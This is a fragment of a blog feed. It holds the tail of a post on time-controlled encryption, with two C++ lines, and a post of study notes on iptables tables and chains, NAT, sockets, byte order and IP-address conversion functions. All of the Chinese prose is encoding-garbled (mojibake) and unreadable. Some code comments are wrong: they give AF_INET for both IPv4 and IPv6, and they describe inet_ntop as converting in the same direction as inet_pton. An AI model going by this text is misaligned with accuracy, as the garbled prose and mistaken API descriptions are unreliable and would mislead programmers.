class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span></span></span></span>ï¼Œå…¶ä¸­<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>H</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">H_1()</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mclose">)</span></span></span></span>ä¸ºå‡½æ•°map_to_pointï¼Œå¹¶å°†æ­¤æ¶ˆæ¯å¹¿æ’­</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//æ—¶é—´æœåŠ¡å™¨è®¡ç®—æ—¶é—´é™·é—¨SH1(T)</span><br>ECn ST = s * <span class="hljs-built_in">map_to_point</span>(T, cof);<br></code></pre></td></tr></table></figure></li><li><p>æ¥æ”¶æ–¹æ”¶åˆ°å¹¿æ’­<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mi>T</mi></msub></mrow><annotation encoding="application/x-tex">S_T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>å¹¶è®¡ç®—<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>U</mi><mi>T</mi></msub><mo>=</mo><mi>u</mi><mi>s</mi><mi>k</mi><mo>â‹…</mo><msub><mi>H</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo><mo>=</mo><mi>u</mi><msub><mi>H</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">U_T=usk\cdot H_1(T)=uH_1(T)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">u</span><span class="mord mathnormal">s</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">u</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span></span></span></span></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//æ¥æ”¶æ–¹è®¡ç®—UT,K&#x27;ï¼Œè®¡ç®—M</span><br>ECn UT = usk * <span class="hljs-built_in">map_to_point</span>(T, cof);<br></code></pre></td></tr></table></figure></li><li><p>æ¥æ”¶æ–¹è®¡ç®—</p></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>æ—¶æ§æ€§åŠ å¯†</tag>
      
      <tag>ç®—æ³•å®ç°</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>é›¶ä¿¡ä»»</title>
    <link href="/2023/07/10/%E9%9B%B6%E4%BF%A1%E4%BB%BB/"/>
    <url>/2023/07/10/%E9%9B%B6%E4%BF%A1%E4%BB%BB/</url>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘åœ¨å­¦é›¶ä¿¡ä»»ç›¸å…³çš„çŸ¥è¯†ï¼Œç»™è®°å½•ä¸‹æ¥æ–¹ä¾¿ä»¥åæŸ¥é˜…</p><h1 id="IptablesåŸç†">IptablesåŸç†</h1><p>iptableså°±æ˜¯linuxä¸­çš„é˜²ç«å¢™å·¥å…·ï¼Œå…¶ä¸­çš„å››è¡¨äº”é“¾æ¯”è¾ƒé‡è¦ï¼Œå¹¶ä¸”ç”¨äº†cçš„åº•å±‚ç¼–å†™ã€‚</p><h2 id="å››è¡¨">å››è¡¨</h2><ul><li>raw è¡¨çš„ä½œç”¨æ˜¯å°†å‘½ä¸­è§„åˆ™çš„åŒ…ï¼Œè·³è¿‡å…¶å®ƒè¡¨çš„å¤„ç†ï¼Œå®ƒçš„ä¼˜å…ˆçº§æœ€é«˜ã€‚</li><li>mangle è¡¨çš„ä½œç”¨æ˜¯æ ¹æ®è§„åˆ™ä¿®æ”¹æ•°æ®åŒ…çš„ä¸€äº›æ ‡å¿—ä½ï¼Œæ¯”å¦‚ TTL</li><li>nat è¡¨çš„ä½œç”¨æ˜¯å®ç°ç½‘ç»œåœ°å€è½¬æ¢</li><li>filter è¡¨çš„ä½œç”¨æ˜¯è¿‡æ»¤æŸäº›åŒ…ï¼Œè¿™æ˜¯é˜²ç«å¢™å·¥ä½œçš„åŸºç¡€</li></ul><h3 id="filter-è¿‡æ»¤è¡¨">filter(è¿‡æ»¤è¡¨)</h3><p>åŒ…å«ä¸‰ä¸ªè§„åˆ™é“¾</p><ul><li>INPUT è¾“å…¥é“¾,å¤„ç†ç›®æ ‡åœ°å€ä¸ºæœ¬æœº IP åœ°å€çš„æŠ¥æ–‡ã€‚</li><li>OUTPUT è¾“å‡ºé“¾,å¤„ç†æœ¬æœº IP åœ°å€äº§ç”Ÿçš„æŠ¥æ–‡ã€‚</li><li>FORWARD è½¬å‘é“¾,å¤„ç†ç»è¿‡æœ¬æœºè·¯ç”±çš„æŠ¥æ–‡ã€‚</li></ul><p>ç»è¿‡æœ¬æœºè½¬å‘çš„æŠ¥æ–‡ç»è¿‡ FORWARD é“¾,ä¸ç»è¿‡ IPPUT é“¾å’Œ OUTPUT é“¾ã€‚</p><h3 id="nat-ç½‘ç»œåœ°å€è½¬æ¢è¡¨">nat(ç½‘ç»œåœ°å€è½¬æ¢è¡¨)</h3><p>å…ˆç§‘æ™®ä¸€ä¸‹ç½‘ç»œåœ°å€è½¬æ¢æ˜¯ä»€ä¹ˆ</p><p>NATçš„ä¸»è¦åŠŸèƒ½æ˜¯å°†æºIPåœ°å€å’Œ/æˆ–ç›®æ ‡IPåœ°å€åœ¨æ•°æ®åŒ…ç»è¿‡ç½‘ç»œè¾¹ç•Œè®¾å¤‡ï¼ˆå¦‚è·¯ç”±å™¨æˆ–é˜²ç«å¢™ï¼‰æ—¶è¿›è¡Œè½¬æ¢ã€‚è¿™ç§è½¬æ¢å¯ä»¥åœ¨ä¸åŒå±‚çº§ä¸Šè¿›è¡Œï¼ŒåŒ…æ‹¬ç½‘ç»œå±‚ï¼ˆIPåœ°å€è½¬æ¢ï¼‰å’Œä¼ è¾“å±‚ï¼ˆç«¯å£è½¬æ¢ï¼‰ã€‚</p><ol><li>æºåœ°å€è½¬æ¢ï¼ˆSource NATï¼ŒSNATï¼‰ï¼šå°†ç§æœ‰ç½‘ç»œå†…éƒ¨ä¸»æœºçš„æºIPåœ°å€è½¬æ¢ä¸ºå…¬å…±ç½‘ç»œä¸Šçš„ä¸€ä¸ªIPåœ°å€ã€‚è¿™å…è®¸ç§æœ‰ç½‘ç»œä¸­çš„ä¸»æœºé€šè¿‡å…±äº«å•ä¸ªå…¬å…±IPåœ°å€æ¥è®¿é—®äº’è”ç½‘ã€‚</li><li>ç›®æ ‡åœ°å€è½¬æ¢ï¼ˆDestination NATï¼ŒDNATï¼‰ï¼šå°†å…¬å…±ç½‘ç»œä¸Šçš„ç›®æ ‡IPåœ°å€è½¬æ¢ä¸ºç§æœ‰ç½‘ç»œå†…éƒ¨ä¸»æœºçš„ä¸€ä¸ªIPåœ°å€ã€‚è¿™å…è®¸ä»å…¬å…±ç½‘ç»œè®¿é—®ç‰¹å®šæœåŠ¡æˆ–åº”ç”¨ç¨‹åºæ—¶ï¼Œå°†æµé‡å®šå‘åˆ°ç§æœ‰ç½‘ç»œä¸­çš„ç‰¹å®šä¸»æœºæˆ–æœåŠ¡å™¨ã€‚</li><li>ç«¯å£åœ°å€è½¬æ¢ï¼ˆPort Address Translationï¼ŒPATï¼‰ï¼šåœ¨NATè¿‡ç¨‹ä¸­åŒæ—¶è½¬æ¢IPåœ°å€å’Œç«¯å£å·ã€‚é€šè¿‡åœ¨ä¼ è¾“å±‚çº§åˆ«ä¸Šå¯¹ç«¯å£å·è¿›è¡Œè½¬æ¢ï¼Œå¯ä»¥å°†å¤šä¸ªç§æœ‰ç½‘ç»œä¸»æœºå…±äº«å•ä¸ªå…¬å…±IPåœ°å€ã€‚</li></ol><p>nat ç”¨æ¥å®Œæˆæº/ç›®çš„åœ°å€å’Œç«¯å£çš„è½¬æ¢,å½“ä¸€ä¸ªæŠ¥æ–‡åœ¨åˆ›å»ºä¸€ä¸ªæ–°çš„è¿æ¥æ—¶è¿›å…¥è¯¥è¡¨ã€‚å®ƒä¹Ÿæœ‰ 3 ä¸ªå†…ç½®è§„åˆ™é“¾ã€‚</p><ul><li>PREROUTING:ç”¨äºä¿®æ”¹åˆ°æ¥çš„æŠ¥æ–‡,åªç”¨æ¥åšç½‘ç»œåœ°å€è½¬æ¢ã€‚</li><li>OUTPUT:ç”¨äºä¿®æ”¹æœ¬æœºäº§ç”Ÿçš„å¹¶ä¸”åœ¨è·¯ç”±å¤„ç†ä¹‹å‰çš„æŠ¥æ–‡ã€‚</li><li>POSTROUTING:ç”¨äºå¯¹è½¬æ¢åçš„æ•°æ®åŒ…è¿›è¡Œè¿›ä¸€æ­¥å¤„ç†ï¼Œæ¯”å¦‚ä¿®æ”¹æ•°æ®åŒ…çš„æºåœ°å€ã€æºç«¯å£ã€‚</li></ul><h2 id="mangle-ä¿®æ”¹è¡¨">mangle(ä¿®æ”¹è¡¨)</h2><p>è¿™ä¸ªè¡¨ä¸»è¦ç”¨æ¥è¿›è¡ŒæŠ¥æ–‡ä¿®æ”¹,æœ‰ 5 ä¸ªå†…ç½®è§„åˆ™é“¾ã€‚</p><ul><li>PREROUTINGï¼šé’ˆå¯¹åˆ°æ¥çš„æŠ¥æ–‡,åœ¨è·¯ç”±ä¹‹å‰ä¿®æ”¹çš„åœ°æ–¹ã€‚</li><li>INPUTï¼šé’ˆå¯¹ç›®çš„åœ°å€ä¸ºç½‘å…³æœ¬èº«çš„æŠ¥æ–‡ã€‚</li><li>FORWARDï¼šé’ˆå¯¹é€šè¿‡ç½‘å…³è·¯ç”±è½¬å‘çš„æŠ¥æ–‡ã€‚</li><li>POSTROUTINGï¼šå°†è¦å‘é€å‡ºå»çš„æŠ¥æ–‡çš„åœ°æ–¹ã€‚</li><li>OUTPUTï¼šæœ¬æœºäº§ç”ŸæŠ¥æ–‡åœ¨è·¯ç”±ä¹‹å‰ä¿®æ”¹çš„åœ°æ–¹ã€‚</li></ul><p>é€šå¸¸ä½¿ç”¨è¯¥è¡¨è¿›è¡ŒæŠ¥æ–‡ä¿®æ”¹,ä»¥ä¾¿è¿›è¡Œ QoS å’Œç­–ç•¥è·¯ç”±ã€‚é€šå¸¸æ¯ä¸€ä¸ªæŠ¥æ–‡éƒ½è¿›å…¥è¯¥è¡¨ï¼Œä½†ä¸ä½¿ç”¨å®ƒæ¥åšæŠ¥æ–‡è¿‡æ»¤ã€‚</p><h3 id="raw-åŸå§‹è¡¨">raw(åŸå§‹è¡¨)</h3><p>è¿™ä¸ªè¡¨ä¸»è¦ç”¨äºé…ç½®è¿æ¥è·Ÿè¸ªç›¸å…³å†…å®¹,åœ¨ ip_conntrack ä¹‹å‰è°ƒç”¨ã€‚</p><ul><li>PREPROUTING:åˆ°è¾¾æœ¬æœºçš„æŠ¥æ–‡ã€‚</li><li>OUTPUT:æœ¬æœºè¿›ç¨‹äº§ç”Ÿçš„æŠ¥æ–‡ã€‚</li></ul><p>è¿™é‡Œæ˜¯èƒ½å¤Ÿåœ¨è¿æ¥è·Ÿè¸ªç”Ÿæ•ˆå‰å¤„ç†æŠ¥æ–‡çš„åœ°æ–¹,ä½ å¯ä»¥æ ‡è®°ç¬¦åˆæŸç§æ¡ä»¶çš„æŠ¥æ–‡ä¸è¢«è¿æ¥è·Ÿè¸ªå¤„ç†ã€‚</p><h3 id="security-è¡¨-æ–°å¢">security è¡¨(æ–°å¢)</h3><p>è¿™ä¸ªè¡¨ç”¨äºå®‰å…¨ Linux çš„é˜²ç«å¢™è§„åˆ™,æ˜¯ iptables æœ€è¿‘çš„æ–°å¢è¡¨,åœ¨å®é™…é¡¹ç›®ä¸­è¿˜å¾ˆå°‘ç”¨åˆ°ã€‚</p><h2 id="äº”é“¾">äº”é“¾</h2><p>äº”é“¾åˆšåˆšå·²ç»åŸºæœ¬ä¸Šéƒ½æåˆ°äº†ï¼Œä¸‹é¢å°†æ ¹æ®ä¿¡æ¯åœ¨é˜²ç«å¢™ä¸­çš„å¤„ç†æ–¹å¼æ¥è¿›ä¸€æ­¥åŠ æ·±ç†è§£ã€‚</p><p>ï¼ˆ1ï¼‰å½“ä¸€ä¸ªæ•°æ®åŒ…è¿›å…¥ç½‘å¡æ—¶ï¼Œå®ƒé¦–å…ˆè¿›å…¥<font color=Red>PREROUTING</font>é“¾ï¼Œå†…æ ¸æ ¹æ®æ•°æ®åŒ…ç›®çš„IPåˆ¤æ–­æ˜¯å¦éœ€è¦è½¬é€å‡ºå»ã€‚</p><p>ï¼ˆ2ï¼‰å¦‚æœæ•°æ®åŒ…å°±æ˜¯è¿›å…¥æœ¬æœºçš„ï¼Œå®ƒå°±ä¼šæ²¿ç€å›¾å‘ä¸‹ç§»åŠ¨ï¼Œåˆ°è¾¾<font color=Red>INPUT</font>é“¾ã€‚æ•°æ®åŒ…åˆ°äº†<font color=Red>INPUT</font>é“¾åï¼Œä»»ä½•è¿›ç¨‹éƒ½ä¼šæ”¶åˆ°å®ƒã€‚æœ¬æœºä¸Šè¿è¡Œçš„ç¨‹åºå¯ä»¥å‘é€æ•°æ®åŒ…ï¼Œè¿™äº›æ•°æ®åŒ…ä¼šç»è¿‡<font color=Red>OUTPUT</font>é“¾ï¼Œç„¶ååˆ°è¾¾<font color=Red>POSTROUTING</font>é“¾è¾“å‡ºã€‚</p><p>ï¼ˆ3ï¼‰å¦‚æœæ•°æ®åŒ…æ˜¯è¦è½¬å‘å‡ºå»çš„ï¼Œä¸”å†…æ ¸å…è®¸è½¬å‘ï¼Œæ•°æ®åŒ…å°±ä¼šå¦‚å›¾æ‰€ç¤ºå‘å³ç§»åŠ¨ï¼Œç»è¿‡<font color=Red>FORWARD</font>é“¾ï¼Œç„¶ååˆ°è¾¾<font color=Red>POSTROUTING</font>é“¾è¾“å‡ºã€‚</p><p>æ•°æ®æ¥æ”¶å¤„ç†æµç¨‹ï¼š<strong>PREROUTINGé“¾ -&gt; è·¯ç”±åˆ¤æ–­ï¼ˆæ˜¯æœ¬æœºï¼‰-&gt; INPUTé“¾</strong> -&gt; â€¦</p><p>æœ¬æœºå‘é€æ•°æ®åŒ…æµç¨‹ï¼š<strong>è·¯ç”±é€‰æ‹©</strong> -&gt; <strong>OUTPUTé“¾</strong> -&gt; <strong>POSTROUTINGé“¾</strong> -&gt; â€¦</p><p>è½¬å‘æ•°æ®æµç¨‹ï¼š<strong>PREROUTINGé“¾</strong> -&gt; è·¯ç”±åˆ¤æ–­ï¼ˆä¸æ˜¯æœ¬è®¾å¤‡ï¼Œæ‰¾åˆ°ä¸‹ä¸€è·³ï¼‰ -&gt; <strong>FORWARDé“¾</strong> -&gt; <strong>POSTROUTINGé“¾</strong> -&gt; â€¦</p><p>æ‰€ä»¥å››è¡¨äº”é“¾çš„å…³ç³»å¦‚å›¾æ‰€ç¤º</p><p><img src="%E9%9B%B6%E4%BF%A1%E4%BB%BB/Iptables_1.png" alt="iptables_1"></p><p>è§£ç­”ï¼šå¤šä¸ªé’©å­å¯ä»¥å¤„ç†ä¸åŒçš„åº”ç”¨åœºæ™¯ï¼Œæ•°æ®æ¥æ”¶ï¼Œæ•°æ®å‘é€å’Œæ•°æ®è½¬å‘éœ€è¦ä¸ä¸€æ ·çš„ç­–ç•¥ã€‚æ‰€ä»¥ä¸èƒ½å•å•ä½¿ç”¨ä¸€ä¸ªé’©å­è§£å†³ï¼Œå®é™…é—®é¢˜æ˜¯å¤æ‚çš„è€Œä¸æ˜¯å•ä¸€çš„ã€‚</p><h1 id="Socketç¼–ç¨‹">Socketç¼–ç¨‹</h1><p>åœ¨TCP/IPåè®®ä¸­ï¼Œâ€œIPåœ°å€+TCPæˆ–UDPç«¯å£å·â€å”¯ä¸€æ ‡è¯†ç½‘ç»œé€šè®¯ä¸­çš„ä¸€ä¸ªè¿›ç¨‹ã€‚â€œIPåœ°å€+ç«¯å£å·â€å°±å¯¹åº”ä¸€ä¸ªsocketã€‚æ¬²å»ºç«‹è¿æ¥çš„ä¸¤ä¸ªè¿›ç¨‹å„è‡ªæœ‰ä¸€ä¸ªsocketæ¥æ ‡è¯†ï¼Œé‚£ä¹ˆè¿™ä¸¤ä¸ªsocketç»„æˆçš„socket pairå°±å”¯ä¸€æ ‡è¯†ä¸€ä¸ªè¿æ¥ã€‚å› æ­¤å¯ä»¥ç”¨Socketæ¥æè¿°ç½‘ç»œè¿æ¥çš„ä¸€å¯¹ä¸€å…³ç³»ã€‚</p><p><img src="%E9%9B%B6%E4%BF%A1%E4%BB%BB%5CSocket_1.png" alt="Socket_1"></p><h2 id="åè®°">åè®°</h2><p>åœ¨é˜²ç«å¢™ä¸­ï¼Œé”šç‚¹æ˜¯ä¸€ç§æœºåˆ¶ï¼Œç”¨äºå°†ä¸€ç»„è§„åˆ™ç»‘å®šåˆ°ç‰¹å®šçš„ç½‘ç»œæ¥å£ã€IPåœ°å€ã€åè®®æˆ–æœåŠ¡ç­‰ã€‚é”šç‚¹æä¾›äº†ä¸€ç§æœ‰ç»„ç»‡çš„æ–¹å¼æ¥ç®¡ç†å’Œåº”ç”¨è§„åˆ™é›†ï¼Œä»¥æ ¹æ®ç‰¹å®šçš„æ¡ä»¶å¯¹ç½‘ç»œæµé‡è¿›è¡Œå¤„ç†ã€‚</p><h2 id="ç½‘ç»œå­—èŠ‚åº">ç½‘ç»œå­—èŠ‚åº</h2><p>å†…å­˜ä¸­çš„å¤šå­—èŠ‚æ•°æ®ç›¸å¯¹äºå†…å­˜åœ°å€æœ‰å¤§ç«¯å’Œå°ç«¯ä¹‹åˆ†ï¼Œå‘é€ä¸»æœºé€šå¸¸å°†å‘é€ç¼“å†²åŒºä¸­çš„æ•°æ®æŒ‰å†…å­˜åœ°å€ä»ä½åˆ°é«˜çš„é¡ºåºå‘å‡ºï¼Œæ¥æ”¶ä¸»æœºæŠŠä»ç½‘ç»œä¸Šæ¥åˆ°çš„å­—èŠ‚ä¾æ¬¡ä¿å­˜åœ¨æ¥æ”¶ç¼“å†²åŒºä¸­ï¼Œä¹Ÿæ˜¯æŒ‰å†…å­˜åœ°å€ä»ä½åˆ°é«˜çš„é¡ºåºä¿å­˜ï¼Œå› æ­¤ï¼Œç½‘ç»œæ•°æ®æµçš„åœ°å€åº”è¿™æ ·è§„å®šï¼šå…ˆå‘å‡ºçš„æ•°æ®æ˜¯ä½åœ°å€ï¼Œåå‘å‡ºçš„æ•°æ®æ˜¯é«˜åœ°å€ã€‚</p><p>TCP/IPåè®®è§„å®šï¼Œç½‘ç»œæ•°æ®æµåº”é‡‡ç”¨å¤§ç«¯å­—èŠ‚åºï¼Œæ‰€ä»¥å¯èƒ½éœ€è¦ç”¨åˆ°å­—èŠ‚åºè½¬æ¢</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">htonl</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> hostlong)</span>; <span class="hljs-comment">//IP</span><br><span class="hljs-type">uint16_t</span> <span class="hljs-title function_">htons</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> hostshort)</span>; <span class="hljs-comment">//port</span><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">ntohl</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> netlong)</span>; <span class="hljs-comment">//IP</span><br><span class="hljs-type">uint16_t</span> <span class="hljs-title function_">ntohs</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> netshort)</span>; <span class="hljs-comment">//port</span><br></code></pre></td></tr></table></figure><p>hè¡¨ç¤ºhostï¼Œnè¡¨ç¤ºnetworkï¼Œlè¡¨ç¤ºlongï¼Œ32ä½é•¿æ•´æ•°ï¼Œsè¡¨ç¤ºshortï¼Œ16ä½çŸ­æ•´æ•°ã€‚</p><p>å¦‚æœä¸»æœºæ˜¯å°ç«¯å­—èŠ‚åºï¼Œè¿™äº›å‡½æ•°å°†å‚æ•°åšç›¸åº”çš„å¤§å°ç«¯è½¬æ¢ç„¶åè¿”å›ï¼Œå¦‚æœä¸»æœºæ˜¯å¤§ç«¯å­—èŠ‚åºï¼Œè¿™äº›å‡½æ•°ä¸åšè½¬æ¢ï¼Œå°†å‚æ•°åŸå°ä¸åŠ¨åœ°è¿”å›ã€‚</p><h2 id="IPåœ°å€è½¬æ¢å‡½æ•°">IPåœ°å€è½¬æ¢å‡½æ•°</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">inet_pton</span><span class="hljs-params">(<span class="hljs-type">int</span> af, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *src, <span class="hljs-type">void</span> *dst)</span>;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">ä½œç”¨ï¼šå°†æœ¬åœ°å­—èŠ‚åº(string IP)è½¬æ¢æˆç½‘ç»œå­—èŠ‚åº</span><br><span class="hljs-comment">å‚æ•°åˆ—è¡¨ï¼š</span><br><span class="hljs-comment">af:åè®®ç±»å‹ï¼ŒAF_INETæ˜¯ipv4ï¼ŒAF_INETæ˜¯ipv6</span><br><span class="hljs-comment">src:ä¼ å…¥å‚æ•°ï¼ŒIPåœ°å€(ç‚¹åˆ†åè¿›åˆ¶å½¢å¼)</span><br><span class="hljs-comment">dst:ä¼ å‡ºå‚æ•°ï¼Œè½¬æ¢åçš„ç½‘ç»œå­—èŠ‚åºIPåœ°å€</span><br><span class="hljs-comment">è¿”å›å€¼ï¼š</span><br><span class="hljs-comment">æˆåŠŸï¼šè¿”å›1</span><br><span class="hljs-comment">å¼‚å¸¸ï¼šè¿”å›0ï¼Œsrcä¸æ˜¯æœ‰æ•ˆçš„IPåœ°å€</span><br><span class="hljs-comment">å¤±è´¥ï¼šè¿”å›-1</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">inet_ntop</span><span class="hljs-params">(<span class="hljs-type">int</span> af, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *src, <span class="hljs-type">char</span> *dst, <span class="hljs-type">socklen_t</span> size)</span>;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">ä½œç”¨ï¼šå°†æœ¬åœ°å­—èŠ‚åº(string IP)è½¬æ¢æˆç½‘ç»œå­—èŠ‚åº</span><br><span class="hljs-comment">å‚æ•°åˆ—è¡¨ï¼š</span><br><span class="hljs-comment">af:åè®®ç±»å‹ï¼ŒAF_INETæ˜¯ipv4ï¼ŒAF_INETæ˜¯ipv6</span><br><span class="hljs-comment">src:ç½‘ç»œå­—èŠ‚åºIPåœ°å€</span><br><span class="hljs-comment">dst:æœ¬åœ°å­—èŠ‚åºIPåœ°å€</span><br><span class="hljs-comment">size:dst</span><br><span class="hljs-comment">è¿”å›å€¼ï¼š</span><br><span 